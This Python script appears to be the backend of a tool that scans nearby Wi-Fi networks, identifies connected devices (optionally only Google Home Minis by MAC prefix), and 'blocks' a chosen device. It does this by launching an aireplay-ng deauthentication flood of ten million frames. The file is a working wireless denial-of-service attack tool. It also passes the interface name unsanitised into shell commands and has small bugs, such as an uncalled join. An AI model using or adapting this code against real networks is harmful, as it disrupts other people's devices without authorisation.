import os
from scapy.all import *
from threading import Thread
import time
import pandas
from mac_vendor_lookup import MacLookup
from subprocess import Popen, PIPE

def add_wlan_names(dropdown_menu): 
    # Retrieve interfaces to use for monitoring the internet traffic
    print("Getting the wifi devices")

    # Read from the wireless connection file in linux
    f = open("/proc/net/dev")

    # Get the wireless file, with the first two columns dropped (gives column info)
    wlanConnectors = f.read().splitlines()[2:]
    
    # close the file after reading the wireless connection
    f.close()

    # filter the wireless connections to the device names
    wlanNames = [connection.split()[0][0:-1] for connection in wlanConnectors]

    for wlan in wlanNames:
        if "wlan" in wlan:
            dropdown_menu.addItem(wlan)

def set_monitor_mode(network_interface):
    print("Setting op monitor mode for " + network_interface)
    os.system("sudo systemctl stop NetworkManager")
    os.system("sudo ifconfig " + network_interface + " down")
    os.system("sudo airmon-ng kill")
    os.system("sudo iwconfig " + network_interface + " mode monitor")    
    os.system("sudo ifconfig " + network_interface + " up")
    os.system("sudo airmon-ng start " + network_interface)
    print("Done setting up monitor mode for " + network_interface)

def get_networks(network_monitor, networks, stop_event):    
    
    def process_packet(packet):
        if packet.haslayer("Dot11Beacon"):
            # Get the mac address
            bssid = packet["Dot11"].addr2
            if bssid not in networks.index.values:
                # Get the name of the network
                ssid = packet["Dot11Elt"].info.decode()

                # Try to get the signal strength
                try: 
                    dbm_signal = packet.dBm_AntSignal
                except:
                    dbm_signal = "N/A"
                
                # Get the network stats
                stats = packet["Dot11Beacon"].network_stats()

                # Get the channel of the AP
                channel = stats.get("channel")

                # Get the cryptographic encryption
                crypto = stats.get("crypto")
                networks.loc[bssid] = (ssid, dbm_signal, channel, crypto)

    def change_channel(stop_event):
        ch = 1
        while not stop_event.is_set():
            # Keep changing the channel from 1 to 14
            os.system(f"iwconfig {network_monitor} channel {ch}")
            ch = ch % 13 + 1
            time.sleep(0.2)

    # Start changing channels
    channel_changer = Thread(target=change_channel, args=(stop_event,))
    channel_changer.daemon = True
    channel_changer.start()
    
    sniff(prn=process_packet, iface=network_monitor, stop_filter=lambda p: stop_event.is_set())

def get_devices(network_monitor, wifi_network, devices, stop_event): 
    # Lists of mac addresses that the mac lookup does not know
    unknown_mac = []

    # Specify if the mac vendor is applied or only google home products are applied
    GOOGLE_HOME_MAC = True

    # The Google Home Devices with vendor numbers:
    vendor_addresses = [["Google Home Mini 1st gen", "44:07:0b"], ["Google Home Mini 2nd gen", "d4:f5:47"]]
    google_home_mac_addresses = pandas.DataFrame(vendor_addresses, columns=["Device_Type", "Vendor_MAC"])
    google_home_mac_addresses.set_index("Vendor_MAC", inplace=True)

    def process_packet(packet):
        if packet.haslayer("Dot11"):
            # The source is the router
            if packet.addr2 == wifi_network.index[0] and filter_packet(packet.addr1):
                # Now its a dataframe
                devices.loc[packet.addr1] = (look_up_mac(packet.addr1))
            
            # The destination is the router
            if packet.addr1 == wifi_network.index[0] and filter_packet(packet.addr2):
                devices.loc[packet.addr2] = (look_up_mac(packet.addr2))

    def filter_packet(MAC):
        # If the mac address is missing
        if MAC == None:
            return False

        # If the mac address is FF:FF:FF:FF:FF:FF ( broadcast ) then discard it
        elif MAC == "ff:ff:ff:ff:ff:ff":
            return False
        
        # If google home devices only is enabled then filter google home devices
        if (GOOGLE_HOME_MAC):
            # Check if the mac address is from the specified google home mac addresses
            if MAC[0:8] in google_home_mac_addresses.index:
                return True
            else: return False
        else:
            return True

    def look_up_mac(MAC):
        if GOOGLE_HOME_MAC:
            # Look up the device in the pre-defined list of MAC addresses
            return google_home_mac_addresses.loc[MAC[0:8]]['Device_Type']
        
        # otherwise use the vendor lookup
        else:
            # If the address already has been scanned then do not do it again
            if MAC in unknown_mac:
                return "UNKNOWN"

            # Try to scan the vendor
            try:
                return MacLookup().lookup(MAC)
            except KeyError as e:
                unknown_mac.append(MAC)
                return "UNKNOWN"

    # Set the network monitor to the correct channel
    ch = wifi_network["Channel"][0]

    os.system(f"iwconfig {network_monitor} channel {ch}")
    devices2 = []

    sniff(prn=process_packet, iface=network_monitor, stop_filter=lambda p: stop_event.is_set())

def execute_command_terminate(command, stop_event):
    process = Popen(command, stdout = PIPE, stderr = PIPE)
    
    while not stop_event.is_set():
        time.sleep(0.1)
    process.terminate()

def block_device(network_monitor, wifi_network, device, stop_event):
    # Amount of packets per batch of sending packets to the router
    AMOUNT_PACKETS_PER_BATCH = 64

    # Amount of time between sending the batches in seconds
    INTERVAL_TIME_BATCHES = 0.5

    bssid = wifi_network.index[0]
    client = device.index[0]

    cmd = (['aireplay-ng', '--deauth', '10000000', '-a', bssid, '-c', client, network_monitor ])
    deauth_thread = threading.Thread(target=execute_command_terminate, args = (cmd, stop_event,))
    deauth_thread.start()
    deauth_thread.join
